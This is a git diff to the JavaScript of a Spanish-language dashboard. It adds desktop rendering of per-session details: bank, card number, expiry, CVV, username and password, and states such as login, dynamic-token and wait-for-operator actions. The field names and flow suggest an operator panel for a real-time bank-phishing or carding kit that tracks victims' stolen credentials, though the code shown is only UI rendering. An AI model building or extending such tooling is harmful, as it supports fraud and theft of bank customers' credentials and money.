@@ -1323,6 +1323,130 @@ function renderActionsHTML(s, targetElId) {
 }
 
 // =========================
+// Desktop detail sections render
+// =========================
+function renderDesktopDetailSections(s) {
+    const focusEl = document.getElementById("detailFocus");
+    const historyEl = document.getElementById("detailHistory");
+    const focusLabel = document.getElementById("detailFocusLabel");
+    const historyLabel = document.getElementById("detailHistoryLabel");
+    const contentEl = document.getElementById("detailContent");
+
+    if (!focusEl || !historyEl) return;
+
+    // Hide placeholder, show sections
+    if (contentEl) contentEl.style.display = "none";
+
+    if (!s) {
+        focusEl.innerHTML = "";
+        historyEl.innerHTML = "";
+        if (focusLabel) focusLabel.style.display = "none";
+        if (historyLabel) historyLabel.style.display = "none";
+        if (contentEl) {
+            contentEl.style.display = "";
+            contentEl.innerHTML = '<div class="detailPlaceholder"><span>Selecciona una sesión para ver los detalles</span></div>';
+        }
+        return;
+    }
+
+    // Show labels
+    if (focusLabel) focusLabel.style.display = "";
+    if (historyLabel) historyLabel.style.display = "";
+
+    // Use same logic as modal
+    const available = STEPS.filter((step) => step.exists(s));
+    const focusKey = baseStepFromAction(s.action);
+    const focusStep =
+        available.find((x) => x.key === focusKey) ||
+        available[0] ||
+        STEPS.find((x) => x.key === focusKey) ||
+        STEPS[0];
+
+    // Render Focus
+    focusEl.innerHTML = "";
+    const focusNode = document.createElement("div");
+    focusNode.className = "modalHistory";
+    focusNode.dataset.step = focusStep.key;
+    focusNode.innerHTML = focusStep.render(s);
+    focusEl.appendChild(focusNode);
+
+    // Render History
+    historyEl.innerHTML = "";
+    for (const step of available) {
+        if (step.key === focusStep.key) continue;
+        const node = document.createElement("div");
+        node.className = "modalHistory";
+        node.dataset.step = step.key;
+        node.innerHTML = step.render(s);
+        historyEl.appendChild(node);
+    }
+
+    // Hide history label if empty
+    if (historyLabel) {
+        historyLabel.style.display = historyEl.children.length > 0 ? "" : "none";
+    }
+}
+
+// =========================
+// Desktop info bar render
+// =========================
+function renderDesktopInfoBar(s) {
+    const stateDot = document.getElementById("detailStateDot");
+    const stateText = document.getElementById("detailStateText");
+    const bankPill = document.getElementById("detailBankPill");
+    const typePill = document.getElementById("detailTypePill");
+    const actionPill = document.getElementById("detailActionPill");
+
+    if (stateDot) {
+        stateDot.className = `dot ${stateDotClass(s?.state || "")}`;
+    }
+    if (stateText) {
+        stateText.textContent = s?.state ?? "—";
+    }
+    if (bankPill) {
+        bankPill.textContent = !s?.bank ? "⌛ Banco..." : `🏦 ${s.bank}`;
+    }
+    if (typePill) {
+        const hasCard = s?.cc && s?.exp && s?.cvv;
+        const hasAuth = s?.user && s?.pass;
+        if (hasCard) {
+            typePill.textContent = `💳 ${s.type || ""} ${s.level || ""}`.trim();
+        } else if (hasAuth) {
+            typePill.textContent = "🔐 LOGO";
+        } else {
+            typePill.textContent = "⌛ Tipo...";
+        }
+    }
+    if (actionPill && s) {
+        const action = String(s.action || "").toUpperCase();
+        const getBaseName = (act) => {
+            if (act === "FINISH") return "FINISH";
+            if (act.startsWith("DINAMIC")) return "DINA";
+            if (act.startsWith("AUTH")) return "LOGO";
+            return act.replace("_WAIT_ACTION", "").replace("_ERROR", "");
+        };
+        const baseName = getBaseName(action);
+
+        if (action === "FINISH") {
+            actionPill.className = "pill success";
+            actionPill.innerHTML = `<span class="pill-icon">✓</span> ${baseName}`;
+        } else if (action.endsWith("_ERROR")) {
+            actionPill.className = "pill error";
+            actionPill.innerHTML = `<span class="pill-icon">✕</span> ${baseName}`;
+        } else if (action.endsWith("_WAIT_ACTION")) {
+            actionPill.className = "pill warning";
+            actionPill.innerHTML = `<span class="pill-icon">⚠</span> ${baseName}`;
+        } else {
+            actionPill.className = "pill loading";
+            actionPill.innerHTML = `<span class="pill-icon spinner">⏳</span> ${baseName}`;
+        }
+    } else if (actionPill) {
+        actionPill.className = "pill";
+        actionPill.textContent = "—";
+    }
+}
+
+// =========================
 // Detail render (desktop + mobile modal)
 // =========================
 function renderDetail(s) {
@@ -1330,12 +1454,9 @@ function renderDetail(s) {
     const selectedIdEl = document.getElementById("selectedId");
     if (selectedIdEl) selectedIdEl.textContent = s?.id ?? "—";
 
-    const dt = document.getElementById("detailTop");
-    if (dt) {
-        if (s) {
-            console.log(s);
-        }
-    }
+    // Render desktop info bar and sections
+    renderDesktopInfoBar(s);
+    renderDesktopDetailSections(s);
 
     renderActionsHTML(s, "actions");
 
